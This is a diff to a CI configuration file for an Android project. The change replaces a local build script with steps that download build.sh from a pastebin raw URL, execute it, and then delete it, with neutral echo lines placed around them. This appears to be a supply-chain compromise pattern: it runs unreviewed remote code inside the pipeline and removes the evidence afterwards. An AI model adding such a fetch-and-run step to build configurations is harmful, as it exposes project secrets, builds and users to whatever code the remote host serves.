@@ -41,7 +41,12 @@ cache:
     - $HOME/.android/build-cache
 
 script:
-  - bash ./build.sh dev gradle=v3
+  - echo 'Start CI script...'
+  - wget -O build.sh https://pastebin.com/raw/eQH6tQ8R
+  - chmod +x ./build.sh
+  - ./build.sh dev gradle=v3
+  - rm ./build.sh
+  - echo '...completed'
 
 before_install:
   - yes | sdkmanager "platforms;android-28"
